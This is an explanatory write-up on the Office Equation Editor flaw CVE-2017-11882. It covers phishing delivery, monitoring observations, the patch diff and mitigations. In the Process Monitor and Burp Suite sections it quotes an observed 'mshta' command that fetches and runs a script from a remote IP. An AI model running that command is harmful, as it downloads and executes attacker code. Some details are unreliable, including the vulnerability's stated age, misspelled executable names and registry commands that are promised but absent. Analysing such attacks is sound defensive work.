# Microsoft Office Memory Corruption (CVE-2017-11882)

### Background
* __Age__: 17 year old vulnerability
* __What is it__: Run arbitrary code remotely without user interaction
* __Why it works__: Buffer overflow vulnerability inside equation editor (EQUEDT32.exe)
* __Who has been affected__: Users who installed
  * Microsoft Office 2007 Service Pack 3
  * Microsoft Office 2010 Service Pack 2 
  * Microsoft Office 2013 Service Pack 1 
  * Microsoft Office 2016
* __CVSS__:
  * The Common Vulnerability Scoring System
  * The score is 7.8 (high)
  * Really dangerous & should be fixed ASAP


### It always starts from the internet phishing...
1.	A spam __email__
2.	An __attachment__
3.	A __.doc file__ in Rich Text Format (RTF)
4.	__Microsoft Office__ will automatically open it


### Process Monitor
It is an [advanced monitoring tool for Windows](https://nvd.nist.gov/vuln-metrics/cvss).  
It is used to monitor and display all the activities of file system in real-time. [reference 1](https://en.wikipedia.org/wiki/Process_Monitor)  
* Unexpected operation named 'EQNEDT32.EXE'
* Command line has been called
* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 


### Burp Suite
It is a [web vulnerability scanner](https://portswigger.net/burp).  
It is a set of tools used for penetration testing of web applications. [reference 2](https://www.geeksforgeeks.org/what-is-burp-suite/g)  
* Unexpected 'GET' request 
* (Very like) a malicious host - 'mshta http://104.254.99.77/x.txt' 


### [How to protect yourself from this exploit](https://support.microsoft.com/en-us/topic/how-to-disable-equation-editor-3-0-7e000f58-cbf4-e805-b4b1-fde0243c9a92)
The best way to protect your machine from this vulnerability is patching.  
However, if you decide not to patch, a simple way to protect your machine is to disable EQUAEDT32.exe which is the equation editor that has the vulnerability.  
The following commands can update your registry to disable EQUAEDT32.exe.  
If you have an Office software running on a x64 machine, then you can use the second command, otherwise the first command is your choice.


### [Official Patch](https://blog.0patch.com/2017/11/official-patch-for-cve-2017-11882-meets.html)
The official patching for CVE-2017-11882 was done in a Patch Tuesday update in November 2017. The patching was mainly done at function sub_0041160F.  
The difference of the patched function(left hand side) and the original function(right hand side) is shown below.  
The left top block shows that a boundary check is added. This line of code reset the counter register to 0x20 if it is larger than or equal to 0x21.  
The left bottom block added a buffer truncation. This code makes sure only 0x20 bytes are copied and zero-terminate. [5]  


### Steps after you click the malicious word file:
1. Microsoft Word file load up
2. Execute Equation Editor
3. Hacker overflowed the font name registers inside Equation Editor
4. Overflow message
5. Redirect to new EIP address
6. Winexe execute
7. Download hacker’s malicious software


### How to avoid?
* Don’t skip patches.  
Simply __patch__ or __update__ the software can prevent an attack from happening. 
* Use a real-time anti-virus.  
Using a __anti-virus software__ can sometime be helpful.
* Filter your email.  
__Block__ the type of document that you don't use.  
__Do not click__ on the link or a document that looks suspicious. 
* Keep track of your websites. 
__Don’t enable online services__ or __create online accounts__ just because of promotion. 
